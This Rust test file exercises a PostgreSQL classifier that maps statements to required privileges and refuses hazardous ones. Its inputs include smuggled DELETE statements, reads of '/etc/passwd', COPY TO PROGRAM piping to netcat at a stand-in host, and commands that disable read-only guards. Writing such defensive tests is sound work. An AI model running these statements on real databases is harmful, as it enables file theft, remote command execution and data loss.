//! The PostgreSQL corpus (features/sql-browser.md Testing Plan, Classifier):
//! every §4.3 hazard as a named test, the §4.2 statement table, refusal
//! classes and limits, then property tests over generated input.

use std::collections::BTreeSet;

use crate::*;

fn ctx() -> NameContext {
    NameContext::postgres("appdb", Some("public".into()), vec!["pg_catalog".into(), "public".into()])
}

fn pg(standard_conforming_strings: bool) -> LexerSettings {
    LexerSettings::PostgreSql { standard_conforming_strings }
}

fn run_in(text: &str, scs: bool, ctx: &NameContext) -> Result<Vec<ClassifiedStatement>, Unclassifiable> {
    classify(Dialect::PostgreSql, pg(scs), text, ctx)
}

fn run(text: &str) -> Result<Vec<ClassifiedStatement>, Unclassifiable> {
    run_in(text, true, &ctx())
}

fn target(t: &SqlTarget) -> String {
    match t {
        SqlTarget::Server => "server".into(),
        SqlTarget::Object(o) => {
            let kind = match o.kind {
                ObjectKind::Relation => "rel",
                ObjectKind::Sequence => "seq",
                ObjectKind::Index => "idx",
                ObjectKind::Routine => "fn",
                ObjectKind::Type => "type",
                ObjectKind::Collation => "coll",
            };
            let catalog = if o.catalog == "appdb" { String::new() } else { format!("{}/", o.catalog) };
            format!("{kind}:{catalog}{}.{}", o.schema.as_deref().unwrap_or("?"), o.name)
        }
    }
}

/// Requirements of a single-statement input, as `"sql_x kind:schema.name"`.
fn render(s: &ClassifiedStatement) -> BTreeSet<String> {
    s.required.iter().map(|(c, t)| format!("{c} {}", target(t))).collect()
}

#[track_caller]
fn one_in(text: &str, scs: bool, ctx: &NameContext) -> ClassifiedStatement {
    match run_in(text, scs, ctx) {
        Ok(mut v) if v.len() == 1 => v.remove(0),
        other => panic!("{text:?}: expected one classified statement, got {other:?}"),
    }
}

#[track_caller]
fn one(text: &str) -> ClassifiedStatement {
    one_in(text, true, &ctx())
}

#[track_caller]
fn requires(text: &str, expected: &[&str]) -> ClassifiedStatement {
    let s = one(text);
    let want: BTreeSet<String> = expected.iter().map(|s| s.to_string()).collect();
    assert_eq!(render(&s), want, "{text:?}");
    s
}

#[track_caller]
fn refused(text: &str, reason: Reason, refusal: Refusal) {
    refused_in(text, true, &ctx(), reason, refusal);
}

#[track_caller]
fn refused_in(text: &str, scs: bool, ctx: &NameContext, reason: Reason, refusal: Refusal) {
    match run_in(text, scs, ctx) {
        Err(u) => {
            assert_eq!((u.reason, u.refusal), (reason, refusal), "{text:?}: {u:?}");
            if u.refusal == Refusal::Unknown {
                assert!(u.span.is_some(), "an Unknown refusal must carry a span: {text:?}");
            }
        }
        Ok(v) => panic!("{text:?}: expected refusal {reason:?}, got {v:?}"),
    }
}

// ---------------------------------------------------------------------------
// §4.3 hazards, one named test each.
// ---------------------------------------------------------------------------

/// Hazard: data-modifying CTEs. Every statement node is classified, never
/// the leading keyword.
#[test]
fn hazard_data_modifying_cte() {
    let s = requires(
        "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d",
        &["sql_delete rel:?.t", "sql_select rel:?.t"],
    );
    assert_eq!(s.kind, StatementKind::Select);
    requires(
        "WITH x AS (INSERT INTO a SELECT * FROM b RETURNING id) SELECT count(*) FROM x",
        &["sql_insert rel:?.a", "sql_select rel:?.a", "sql_select rel:?.b"],
    );
    requires("WITH u AS (UPDATE t SET a = 1 RETURNING a) SELECT 1", &["sql_update rel:?.t", "sql_select rel:?.t"]);
    let s = requires(
        "WITH old AS (SELECT * FROM t) DELETE FROM t USING old WHERE t.id = old.id",
        &["sql_delete rel:?.t", "sql_select rel:?.t"],
    );
    assert_eq!(s.kind, StatementKind::Delete);
}

/// Hazard: multi-statement smuggling. The spans returned are exactly what
/// the server will see as statements; nothing hides inside a literal or a
/// comment the server reads differently.
#[test]
fn hazard_multi_statement_smuggling() {
    let text = "SELECT 1; DELETE FROM t";
    let v = run(text).unwrap();
    assert_eq!(v.iter().map(|s| &text[s.span.clone()]).collect::<Vec<_>>(), ["SELECT 1", "DELETE FROM t"]);
    assert_eq!(render(&v[1]), BTreeSet::from(["sql_delete rel:?.t".to_string()]));

    for text in [
        "SELECT 'x;DELETE FROM t'",
        "SELECT $$;DELETE FROM t;$$",
        "SELECT $a$ $b$ ; DELETE FROM t; $b$ $a$",
        "SELECT 1 /* ; DELETE FROM t; */",
        "SELECT 1 /* /* */ ; DELETE FROM t; */",
        "SELECT \"x;DELETE FROM t\" FROM u",
        "SELECT E'\\'; DELETE FROM t; --'",
    ] {
        let s = one(text);
        assert!(!render(&s).iter().any(|r| r.contains("delete")), "{text:?}: {s:?}");
    }

    // `--` comments end at a carriage return, as the server's do: what
    // follows is code, and it is classified.
    let s = one("SELECT 1 -- c\rFROM t");
    assert_eq!(render(&s), BTreeSet::from(["sql_select rel:?.t".to_string()]));

    // Bit strings take no `''` escape on the server; the parser's tokenizer
    // thinks they do. The disagreement is refused, never resolved either way.
    refused("SELECT B'01''; DELETE FROM t; --'", Reason::LexerDisagreement, Refusal::Never);

    // The whole input is refused when a literal or comment never ends.
    for text in ["SELECT 'abc; DELETE FROM t", "SELECT 1 /* ; DELETE FROM t", "SELECT $q$ ; DELETE FROM t"] {
        let u = run(text).unwrap_err();
        assert_eq!((u.reason, u.refusal, u.span), (Reason::UnterminatedLiteral, Refusal::Never, None), "{text:?}");
    }
}

/// Hazard: lexer settings change meaning. The same text classifies
/// differently under `standard_conforming_strings`, and statements that would
/// change a lexer-affecting setting are always refused.
#[test]
fn hazard_lexer_settings() {
    let text = r"SELECT 'a\'; DELETE FROM t; --'";
    // On: the backslash is literal, the string ends, a DELETE follows.
    let v = run_in(text, true, &ctx()).unwrap();
    assert_eq!(v.len(), 2);
    assert_eq!(v[1].kind, StatementKind::Delete);
    // Off: one statement whose plain string holds a backslash the parser
    // cannot read the way the server does. Refused, span intact.
    refused_in(text, false, &ctx(), Reason::BackslashInPlainString, Refusal::Unknown);
    // Without backslashes the setting makes no difference.
    let plain = "SELECT 'it''s'; DELETE FROM t";
    assert_eq!(run_in(plain, true, &ctx()), run_in(plain, false, &ctx()));
    // E'' strings escape regardless of the setting.
    assert_eq!(run_in(r"SELECT E'\''", true, &ctx()), run_in(r"SELECT E'\''", false, &ctx()));

    for text in [
        "SET standard_conforming_strings = off",
        "SET standard_conforming_strings TO on",
        "SET LOCAL Standard_Conforming_Strings = off",
        "SET backslash_quote = on",
        "SET client_encoding = 'SJIS'",
        "SET NAMES 'SJIS'",
        "RESET standard_conforming_strings",
        "RESET ALL",
        "DISCARD ALL",
        "SELECT set_config('standard_conforming_strings', 'off', false)",
        "SELECT set_config('client_encoding', 'SJIS', false)",
        "ALTER SYSTEM SET standard_conforming_strings = off",
        "ALTER SYSTEM RESET ALL",
    ] {
        refused(text, Reason::LexerSettingChange, Refusal::Never);
    }
}

/// Hazard: MySQL / MariaDB executable comments. PostgreSQL has none:
/// `/*! … */` is an ordinary comment there and contributes nothing.
#[test]
fn hazard_executable_comments_are_plain_comments_in_postgresql() {
    let s = requires("/*! DELETE FROM t */ SELECT 1", &["sql_select server"]);
    assert_eq!(s.kind, StatementKind::Select);
    requires("SELECT 1 /*!50000 , pg_sleep(1) */", &["sql_select server"]);
}

/// Hazard: `EXPLAIN ANALYZE` executes. It is classified as the inner
/// statement; plan-only `EXPLAIN` needs `sql_select` on what it touches.
#[test]
fn hazard_explain_analyze_executes() {
    let s = requires("EXPLAIN ANALYZE DELETE FROM t", &["sql_delete rel:?.t"]);
    assert_eq!(s.kind, StatementKind::ExplainAnalyze);
    requires("EXPLAIN (ANALYZE, BUFFERS) UPDATE t SET a = 1", &["sql_update rel:?.t"]);
    // Any ANALYZE option counts as executing, even a false one.
    requires("EXPLAIN (ANALYZE false) DELETE FROM t", &["sql_delete rel:?.t"]);
    let s = requires("EXPLAIN DELETE FROM t", &["sql_select rel:?.t"]);
    assert_eq!(s.kind, StatementKind::Explain);
    requires("EXPLAIN SELECT 1", &["sql_select server"]);
    // The planner may run user functions declared IMMUTABLE: kept as execute.
    let s = requires("EXPLAIN SELECT f(a) FROM t", &["sql_select rel:?.t", "sql_execute fn:?.f"]);
    assert!(s.opaque);
    refused("EXPLAIN SELECT pg_read_file('/etc/passwd')", Reason::ServerFileOrOsAccess, Refusal::Never);
}

/// Hazard: side-effecting functions inside `SELECT`.
#[test]
fn hazard_side_effecting_functions() {
    requires("SELECT nextval('s')", &["sql_update seq:?.s"]);
    requires(
        "SELECT nextval('s'::regclass), currval('public.\"S\"')",
        &["sql_update seq:?.s", "sql_select seq:public.S"],
    );
    requires("SELECT setval('Public.Seq', 1)", &["sql_update seq:public.seq"]);
    requires("SELECT setval('s', (SELECT max(id) FROM t))", &["sql_update seq:?.s", "sql_select rel:?.t"]);
    requires("SELECT lastval()", &["sql_select server"]);
    requires("SELECT pg_advisory_lock(1)", &["sql_update server"]);
    requires("SELECT pg_terminate_backend(42)", &["sql_admin server"]);
    requires("SELECT pg_notify('ch', 'x')", &["sql_execute server"]);
    // A sequence chosen at run time, or by OID, cannot be checked.
    refused("SELECT nextval(name) FROM seqs", Reason::UnresolvableName, Refusal::Unknown);
    refused("SELECT nextval('16384')", Reason::UnresolvableName, Refusal::Unknown);

    for text in [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_catalog.pg_read_binary_file('/etc/passwd')",
        "SELECT * FROM pg_ls_dir('.')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(1, '/tmp/x')",
        "SELECT dblink_exec('host=x', 'DROP TABLE t')",
        "SELECT * FROM public.dblink('host=x', 'SELECT 1') AS r(a int)",
        "SELECT \"pg_read_file\"('x')",
    ] {
        refused(text, Reason::ServerFileOrOsAccess, Refusal::Never);
    }

    // Built-ins with no side effect add nothing.
    requires("SELECT count(*), lower(a), coalesce(b, c), now() FROM t", &["sql_select rel:?.t"]);
    // Unknown functions are user code, opaque.
    let s = requires("SELECT my_func(1) FROM t", &["sql_select rel:?.t", "sql_execute fn:?.my_func"]);
    assert!(s.opaque);
    requires("SELECT app.f()", &["sql_execute fn:app.f"]);
    // A quoted upper-case name is a different function from the built-in.
    requires("SELECT \"LOWER\"('x')", &["sql_execute fn:?.LOWER"]);
    // Functions that run SQL text are opaque execute.
    let s = requires("SELECT query_to_xml('DELETE FROM t', true, true, '')", &["sql_execute server"]);
    assert!(s.opaque);
}

/// In a session the database keeps read-only, user functions need only
/// `sql_select` on the function; dynamic SQL and refused functions do not
/// get that downgrade.
#[test]
fn read_only_sessions_confine_user_functions() {
    let ro = NameContext { database_read_only: true, ..ctx() };
    let s = one_in("SELECT my_func(1)", true, &ro);
    assert_eq!(render(&s), BTreeSet::from(["sql_select fn:?.my_func".to_string()]));
    assert!(!s.opaque);
    let s = one_in("SELECT query_to_xml('x', true, true, '')", true, &ro);
    assert_eq!(render(&s), BTreeSet::from(["sql_execute server".to_string()]));
    refused_in("SELECT dblink_exec('x', 'y')", true, &ro, Reason::ServerFileOrOsAccess, Refusal::Never);
}

/// A user schema ahead of `pg_catalog` can shadow any built-in function or
/// operator: then nothing unqualified is trusted as a built-in.
#[test]
fn search_path_shadowing_makes_every_call_user_code() {
    let shadowed = NameContext::postgres("appdb", Some("public".into()), vec!["public".into(), "pg_catalog".into()]);
    let s = one_in("SELECT lower(a) FROM t", true, &shadowed);
    assert_eq!(render(&s), BTreeSet::from(["sql_select rel:?.t".to_string(), "sql_execute fn:?.lower".to_string()]));
    assert!(s.opaque);
    let s = one_in("SELECT 1 + 1", true, &shadowed);
    assert_eq!(render(&s), BTreeSet::from(["sql_execute server".to_string()]));
    // Qualified with pg_catalog it is the built-in again.
    let s = one_in("SELECT pg_catalog.lower('A')", true, &shadowed);
    assert_eq!(render(&s), BTreeSet::from(["sql_select server".to_string()]));
    // A shadowable writer keeps its own requirement as well.
    let s = one_in("SELECT nextval('s')", true, &shadowed);
    assert_eq!(render(&s), BTreeSet::from(["sql_update seq:?.s".to_string(), "sql_execute fn:?.nextval".to_string()]));
    // Temporary schemas are skipped: functions are never looked up there.
    let temp_first =
        NameContext { search_path: vec!["pg_temp_3".into(), "pg_catalog".into(), "public".into()], ..ctx() };
    let s = one_in("SELECT lower('A')", true, &temp_first);
    assert_eq!(render(&s), BTreeSet::from(["sql_select server".to_string()]));
}

/// Hazard: `SELECT … INTO` creates and fills a table.
#[test]
fn hazard_select_into_creates_a_table() {
    let s = requires(
        "SELECT * INTO newt FROM t",
        &["sql_create rel:public.newt", "sql_insert rel:public.newt", "sql_select rel:?.t"],
    );
    assert_eq!(s.kind, StatementKind::SelectInto);
    requires("SELECT 1 INTO TEMP x", &["sql_create rel:pg_temp.x", "sql_insert rel:pg_temp.x"]);
}

/// Hazard: dynamic SQL hides the real statement — opaque `sql_execute`.
#[test]
fn hazard_dynamic_sql_is_opaque() {
    let s = requires("DO $$ BEGIN DELETE FROM t; END $$", &["sql_execute server"]);
    assert!(s.opaque && s.kind == StatementKind::Do);
    requires("DO LANGUAGE plpgsql 'BEGIN NULL; END'", &["sql_execute server"]);
    let s = requires("PREPARE p AS DELETE FROM t", &["sql_execute server", "sql_delete rel:?.t"]);
    assert!(s.opaque);
    let s = requires("EXECUTE p", &["sql_execute server"]);
    assert!(s.opaque);
    let s = requires("CALL app.proc(nextval('s'))", &["sql_execute fn:app.proc", "sql_update seq:?.s"]);
    assert!(s.opaque);
    // Untrusted languages are server OS access.
    for text in [
        "DO LANGUAGE plpython3u $$ import os $$",
        "DO $$ x $$ LANGUAGE plperlu",
        "CREATE FUNCTION f() RETURNS int LANGUAGE c AS 'lib', 'sym'",
        "CREATE FUNCTION f() RETURNS int AS $$ import os $$ LANGUAGE plpython3u",
    ] {
        refused(text, Reason::ServerFileOrOsAccess, Refusal::Never);
    }
    refused("DO LANGUAGE plmystery $$ x $$", Reason::UnsupportedConstruct, Refusal::Unknown);
}

/// Hazard: unqualified names resolve through the search path. They are
/// left for the caller to resolve through the catalog (§4.4); qualified and
/// new names are canonical.
#[test]
fn hazard_unqualified_names_are_left_to_the_catalog() {
    requires(
        "SELECT * FROM appdb.public.t, \"T\", T, s.\"Mixed\"",
        &["sql_select rel:public.t", "sql_select rel:?.T", "sql_select rel:?.t", "sql_select rel:s.Mixed"],
    );
    requires("SELECT * FROM otherdb.public.t", &["sql_select rel:otherdb/public.t"]);
    // New objects go to current_schema(), temporary ones to pg_temp.
    requires("CREATE TABLE n (a int)", &["sql_create rel:public.n"]);
    requires("CREATE TEMP TABLE n (a int)", &["sql_create rel:pg_temp.n"]);
    let no_schema = NameContext { current_schema: None, ..ctx() };
    refused_in("CREATE TABLE n (a int)", true, &no_schema, Reason::UnresolvableName, Refusal::Unknown);
    assert!(run_in("CREATE TABLE s.n (a int)", true, &no_schema).is_ok());
    // Identifiers are truncated to max_identifier_length, as the server does.
    let long = "x".repeat(70);
    requires(&format!("SELECT * FROM {long}"), &[&format!("sql_select rel:?.{}", "x".repeat(63))]);
    refused("SELECT * FROM a.b.c.d", Reason::UnresolvableName, Refusal::Unknown);
}

/// Hazard: views reach objects the caller has no grant on. The database
/// semantics stand (the owner's privileges apply), so creating a view needs
/// `sql_select` on everything it exposes.
#[test]
fn hazard_views_need_the_creator_to_read_their_sources() {
    requires("CREATE VIEW v AS SELECT * FROM secret", &["sql_create rel:public.v", "sql_select rel:?.secret"]);
    requires("CREATE OR REPLACE VIEW v AS SELECT 1", &["sql_create rel:public.v", "sql_alter rel:public.v"]);
    requires(
        "CREATE MATERIALIZED VIEW mv AS SELECT * FROM t",
        &["sql_create rel:public.mv", "sql_insert rel:public.mv", "sql_select rel:?.t"],
    );
}

/// CTE names shadow tables only where PostgreSQL scopes them. A
/// non-recursive CTE's own body sees the real table of that name.
#[test]
fn cte_names_shadow_tables_only_in_scope() {
    requires("WITH secret AS (SELECT * FROM secret) SELECT * FROM secret", &["sql_select rel:?.secret"]);
    requires("WITH c AS (SELECT 1) SELECT * FROM c", &["sql_select server"]);
    requires("WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT * FROM r) SELECT * FROM r", &["sql_select server"]);
    requires("WITH a AS (SELECT * FROM b), b AS (SELECT 1) SELECT * FROM a", &["sql_select rel:?.b"]);
    requires("SELECT * FROM (WITH s AS (SELECT 1) SELECT * FROM s) x, s", &["sql_select rel:?.s"]);
    // A qualified name is never a CTE.
    requires("WITH t AS (SELECT 1) SELECT * FROM public.t", &["sql_select rel:public.t"]);
    // A DML target is always the real table.
    requires("WITH t AS (SELECT 1) DELETE FROM t", &["sql_delete rel:?.t"]);
}

/// Row locks need `sql_update` on what they lock.
#[test]
fn locks_need_update() {
    requires("SELECT * FROM t FOR UPDATE", &["sql_select rel:?.t", "sql_update rel:?.t"]);
    requires(
        "SELECT * FROM t JOIN u USING (id) FOR SHARE OF t",
        &["sql_select rel:?.t", "sql_update rel:?.t", "sql_select rel:?.u", "sql_update rel:?.u"],
    );
    requires("LOCK TABLE t IN ACCESS EXCLUSIVE MODE", &["sql_select rel:?.t", "sql_update rel:?.t"]);
}

/// §5.3: statements that would lift the read-only guard are refused.
#[test]
fn read_only_guard_changes_are_refused() {
    for text in [
        "BEGIN READ WRITE",
        "START TRANSACTION ISOLATION LEVEL SERIALIZABLE, READ WRITE",
        "SET TRANSACTION READ WRITE",
        "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE",
        "SET default_transaction_read_only = off",
        "SET transaction_read_only TO off",
        "RESET default_transaction_read_only",
        "SELECT set_config('default_transaction_read_only', 'off', false)",
        "ALTER SYSTEM SET default_transaction_read_only = off",
    ] {
        refused(text, Reason::ReadOnlyGuardChange, Refusal::Never);
    }
    for text in ["BEGIN ISOLATION LEVEL SERIALIZABLE", "START TRANSACTION READ ONLY"] {
        assert!(one(text).tx_control, "{text:?}");
    }
    requires("SET TRANSACTION ISOLATION LEVEL SERIALIZABLE", &["sql_select server"]);
}

/// §4.2's always-refused row (PostgreSQL part): `sql_admin` does not
/// unlock it, and an unparsed statement that looks like it is never
/// downgraded to `Unknown`.
#[test]
fn server_file_and_os_access_is_always_refused() {
    for text in [
        "COPY t TO '/tmp/x'",
        "COPY t FROM '/etc/passwd'",
        "COPY t FROM PROGRAM 'id'",
        "COPY (SELECT 1) TO PROGRAM 'nc evil 1'",
        "LOAD 'auto_explain'",
        "CREATE TABLESPACE x LOCATION '/tmp'",
    ] {
        refused(text, Reason::ServerFileOrOsAccess, Refusal::Never);
    }
    // Unparseable, but it names a refused function or COPY: never runs.
    for text in ["COPY t TO STDOUT (FORMAT csv, FORCE_QUOTE *, nonsense", "SELECT pg_read_file('x') FROM FROM"] {
        let u = run(text).unwrap_err();
        assert_eq!(u.refusal, Refusal::Never, "{text:?}: {u:?}");
    }
}

// ---------------------------------------------------------------------------
// §4.2, the rest of the statement table.
// ---------------------------------------------------------------------------

#[test]
fn reads() {
    requires("SELECT 1", &["sql_select server"]);
    requires("VALUES (1), (2)", &["sql_select server"]);
    requires(
        "SELECT * FROM t1 JOIN t2 ON t1.a = t2.a WHERE EXISTS (SELECT 1 FROM t3)",
        &["sql_select rel:?.t1", "sql_select rel:?.t2", "sql_select rel:?.t3"],
    );
    requires(
        "SELECT a FROM t UNION SELECT b FROM u EXCEPT SELECT c FROM v",
        &["sql_select rel:?.t", "sql_select rel:?.u", "sql_select rel:?.v"],
    );
    requires("SELECT a::text, b->>'x', c[1], d ~ 'x', e @> f FROM t", &["sql_select rel:?.t"]);
    requires("SELECT * FROM t, LATERAL unnest(t.arr) u", &["sql_select rel:?.t"]);
    requires("SELECT * FROM generate_series(1, 10) g", &["sql_select server"]);
    requires(
        "SELECT DISTINCT ON (a) a, count(*) OVER (PARTITION BY b) FROM t ORDER BY a LIMIT 10 OFFSET 5",
        &["sql_select rel:?.t"],
    );
    requires("SHOW search_path", &["sql_select server"]);
    requires("DECLARE c CURSOR FOR SELECT * FROM t", &["sql_select rel:?.t"]);
    requires("FETCH 10 FROM c", &["sql_select server"]);
    requires("MOVE NEXT IN c", &["sql_select server"]);
    requires("CLOSE c", &["sql_select server"]);
    requires("COPY t TO STDOUT", &["sql_select rel:?.t"]);
    requires("COPY (SELECT * FROM t) TO STDOUT", &["sql_select rel:?.t"]);
}

#[test]
fn writes() {
    requires("INSERT INTO t VALUES (1)", &["sql_insert rel:?.t"]);
    requires("INSERT INTO t DEFAULT VALUES", &["sql_insert rel:?.t"]);
    requires(
        "INSERT INTO t (a) SELECT b FROM u RETURNING a",
        &["sql_insert rel:?.t", "sql_select rel:?.t", "sql_select rel:?.u"],
    );
    requires("INSERT INTO t SELECT * FROM t", &["sql_insert rel:?.t", "sql_select rel:?.t"]);
    requires("INSERT INTO t VALUES (1) ON CONFLICT DO NOTHING", &["sql_insert rel:?.t", "sql_select rel:?.t"]);
    requires(
        "INSERT INTO t VALUES (1) ON CONFLICT (a) DO UPDATE SET b = excluded.b",
        &["sql_insert rel:?.t", "sql_select rel:?.t", "sql_update rel:?.t"],
    );
    // No column is read: PostgreSQL needs UPDATE only.
    requires("UPDATE t SET a = 1", &["sql_update rel:?.t"]);
    requires("UPDATE t SET a = a + 1 WHERE b = 2", &["sql_update rel:?.t", "sql_select rel:?.t"]);
    requires(
        "UPDATE t SET a = u.b FROM u WHERE t.id = u.id",
        &["sql_update rel:?.t", "sql_select rel:?.t", "sql_select rel:?.u"],
    );
    requires("DELETE FROM t", &["sql_delete rel:?.t"]);
    requires(
        "DELETE FROM t WHERE a IN (SELECT a FROM u)",
        &["sql_delete rel:?.t", "sql_select rel:?.t", "sql_select rel:?.u"],
    );
    requires(
        "DELETE FROM t USING u WHERE t.id = u.id RETURNING t.*",
        &["sql_delete rel:?.t", "sql_select rel:?.t", "sql_select rel:?.u"],
    );
    requires(
        "MERGE INTO t USING u ON t.a = u.a WHEN MATCHED THEN UPDATE SET b = u.b \
         WHEN NOT MATCHED THEN INSERT (a) VALUES (u.a)",
        &["sql_select rel:?.t", "sql_select rel:?.u", "sql_insert rel:?.t", "sql_update rel:?.t"],
    );
    requires(
        "MERGE INTO t USING u ON t.a = u.a WHEN MATCHED THEN DELETE",
        &["sql_select rel:?.t", "sql_select rel:?.u", "sql_delete rel:?.t"],
    );
    requires("COPY t FROM STDIN", &["sql_insert rel:?.t"]);
}

#[test]
fn schema_changes() {
    requires(
        "CREATE TABLE t2 (a int REFERENCES p(id), b text DEFAULT now())",
        &["sql_create rel:public.t2", "sql_alter rel:?.p"],
    );
    requires(
        "CREATE TABLE t3 AS SELECT * FROM t",
        &["sql_create rel:public.t3", "sql_insert rel:public.t3", "sql_select rel:?.t"],
    );
    requires("CREATE TABLE c (LIKE p)", &["sql_create rel:public.c", "sql_select rel:?.p"]);
    requires("CREATE INDEX i ON t (a)", &["sql_create rel:?.t"]);
    requires(
        "CREATE UNIQUE INDEX CONCURRENTLY i ON public.t USING btree (lower(a)) WHERE b > 0",
        &["sql_create rel:public.t"],
    );
    requires("CREATE SEQUENCE s OWNED BY t.a", &["sql_create seq:public.s", "sql_alter rel:?.t"]);
    requires("CREATE SCHEMA s", &["sql_create server"]);
    requires("CREATE SCHEMA s AUTHORIZATION bob", &["sql_create server", "sql_admin server"]);
    requires("CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$", &["sql_create fn:public.f"]);
    requires(
        "CREATE OR REPLACE FUNCTION f(a int) RETURNS int AS $$ BEGIN RETURN a; END $$ LANGUAGE plpgsql",
        &["sql_create fn:public.f", "sql_alter fn:public.f"],
    );
    requires(
        "CREATE TRIGGER trg BEFORE INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()",
        &["sql_create rel:?.t", "sql_execute fn:?.f"],
    );
    requires("CREATE TYPE mood AS ENUM ('a', 'b')", &["sql_create type:public.mood"]);
    requires("CREATE DOMAIN d AS int CHECK (VALUE > 0)", &["sql_create type:public.d"]);
    requires("CREATE POLICY p ON t USING (owner = current_user)", &["sql_create rel:?.t"]);
    requires("ALTER TABLE t ADD COLUMN c int", &["sql_alter rel:?.t"]);
    requires(
        "ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (a) REFERENCES p (id)",
        &["sql_alter rel:?.t", "sql_alter rel:?.p"],
    );
    requires("ALTER TABLE t OWNER TO bob", &["sql_alter rel:?.t", "sql_admin server"]);
    requires("ALTER TABLE t RENAME TO u", &["sql_alter rel:?.t"]);
    requires("ALTER TABLE t ENABLE ROW LEVEL SECURITY", &["sql_alter rel:?.t"]);
    requires("ALTER INDEX i RENAME TO j", &["sql_alter idx:?.i"]);
    requires("ALTER SEQUENCE s RESTART WITH 100", &["sql_alter seq:?.s"]);
    requires("ALTER SEQUENCE IF EXISTS s OWNED BY u.id", &["sql_alter seq:?.s", "sql_alter rel:?.u"]);
    requires("ALTER VIEW v RENAME TO w", &["sql_alter rel:?.v"]);
    requires("ALTER MATERIALIZED VIEW mv OWNER TO bob", &["sql_alter rel:?.mv", "sql_admin server"]);
    requires("COMMENT ON TABLE t IS 'x'", &["sql_alter rel:?.t"]);
    requires("COMMENT ON COLUMN s.t.a IS 'x'", &["sql_alter rel:s.t"]);
    requires("DROP TABLE a, b", &["sql_drop rel:?.a", "sql_drop rel:?.b"]);
    // CASCADE reaches objects the statement does not name.
    requires("DROP TABLE a CASCADE", &["sql_drop rel:?.a", "sql_drop server"]);
    requires("DROP SCHEMA s", &["sql_drop server"]);
    requires("DROP FUNCTION f(int)", &["sql_drop fn:?.f"]);
    requires("DROP INDEX i", &["sql_drop idx:?.i"]);
    requires("DROP TRIGGER trg ON t", &["sql_drop rel:?.t"]);
    requires("TRUNCATE a, b", &["sql_drop rel:?.a", "sql_drop rel:?.b"]);
    requires("TRUNCATE a CASCADE", &["sql_drop rel:?.a", "sql_drop server"]);
}

#[test]
fn maintenance() {
    requires("VACUUM", &["sql_alter server"]);
    requires("VACUUM (VERBOSE, ANALYZE) t", &["sql_alter rel:?.t"]);
    requires("VACUUM FULL public.t, u (a)", &["sql_alter rel:public.t", "sql_alter rel:?.u"]);
    requires("ANALYZE t (a, b)", &["sql_alter rel:?.t"]);
    requires("REINDEX TABLE t", &["sql_alter rel:?.t"]);
    requires("REINDEX (VERBOSE) INDEX CONCURRENTLY i", &["sql_alter idx:?.i"]);
    requires("REINDEX DATABASE d", &["sql_alter server"]);
    requires("CLUSTER t USING i", &["sql_alter rel:?.t"]);
    requires("REFRESH MATERIALIZED VIEW CONCURRENTLY mv WITH DATA", &["sql_alter rel:?.mv"]);
    refused("VACUUM (BOGUS) t", Reason::UnsupportedConstruct, Refusal::Unknown);
    refused("REINDEX (TABLESPACE x) TABLE t", Reason::UnsupportedConstruct, Refusal::Unknown);
}

#[test]
fn administration() {
    for text in [
        "GRANT SELECT ON t TO bob",
        "GRANT admins TO bob",
        "REVOKE ALL ON SCHEMA s FROM PUBLIC",
        "CREATE ROLE bob LOGIN PASSWORD 'x'",
        "CREATE USER bob",
        "ALTER ROLE bob SET search_path = a",
        "DROP ROLE bob",
        "CREATE DATABASE d",
        "DROP DATABASE d",
        "CREATE EXTENSION pgcrypto",
        "CREATE OR REPLACE RULE r AS ON SELECT TO t DO INSTEAD SELECT 1",
        "CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw",
        "CREATE PUBLICATION p FOR ALL TABLES",
        "ALTER DEFAULT PRIVILEGES GRANT SELECT ON TABLES TO bob",
        "SECURITY LABEL ON TABLE t IS 'x'",
        "REASSIGN OWNED BY a TO b",
        "DROP OWNED BY a",
        "CHECKPOINT",
        "ALTER SYSTEM SET work_mem = '1GB'",
        "PREPARE TRANSACTION 'x'",
        "COMMIT PREPARED 'x'",
        "SET ROLE bob",
        "RESET ROLE",
        "SET SESSION AUTHORIZATION bob",
        "SET statement_timeout = 0",
        "SELECT pg_reload_conf()",
    ] {
        let s = requires(text, &["sql_admin server"]);
        assert!(!s.tx_control, "{text:?}");
    }
}

#[test]
fn transaction_control_is_the_only_exemption() {
    for (text, kind) in [
        ("BEGIN", StatementKind::TxBegin),
        ("BEGIN ISOLATION LEVEL SERIALIZABLE", StatementKind::TxBegin),
        ("START TRANSACTION", StatementKind::TxBegin),
        ("COMMIT", StatementKind::TxCommit),
        ("END", StatementKind::TxCommit),
        ("ROLLBACK", StatementKind::TxRollback),
        ("ABORT", StatementKind::TxRollback),
        ("ROLLBACK TO SAVEPOINT a", StatementKind::TxRollback),
        ("SAVEPOINT a", StatementKind::TxSavepoint),
        ("RELEASE SAVEPOINT a", StatementKind::TxReleaseSavepoint),
    ] {
        let s = one(text);
        assert!(s.tx_control && s.required.is_empty() && s.kind == kind, "{text:?}: {s:?}");
    }
}

#[test]
fn session_settings() {
    for text in
        ["SET search_path TO a, b", "SET TIME ZONE 'UTC'", "SET DateStyle = 'ISO'", "RESET search_path", "DISCARD TEMP"]
    {
        let s = requires(text, &["sql_select server"]);
        assert_eq!(s.kind, StatementKind::SetSession, "{text:?}");
    }
    // set_config through SELECT is a session change too.
    let s = requires("SELECT set_config('search_path', 'x', false)", &["sql_select server"]);
    assert_eq!(s.kind, StatementKind::SetSession);
    requires("SELECT set_config('work_mem', '1GB', false)", &["sql_admin server"]);
    refused("SELECT set_config(name, 'x', false) FROM t", Reason::UnresolvableName, Refusal::Unknown);
}

#[test]
fn unknown_statements_are_refused_but_runnable_by_admin() {
    for text in [
        "CREATE AGGREGATE myagg (int) (sfunc = f, stype = int)",
        "SELECT * FROM ROWS FROM (generate_series(1, 2))",
        "CREATE PROCEDURE p() LANGUAGE plpgsql AS $$ BEGIN END $$",
        "TABLE t",
    ] {
        refused(text, Reason::ParseFailed, Refusal::Unknown);
    }
    // String continuation and Unicode escapes are refused before parsing.
    refused("SELECT 'a'\n'b'", Reason::StringContinuation, Refusal::Unknown);
    let u = run("SELECT U&'d\\0061t'").unwrap_err();
    assert_eq!((u.reason, u.refusal), (Reason::UnicodeEscape, Refusal::Never));
}

#[test]
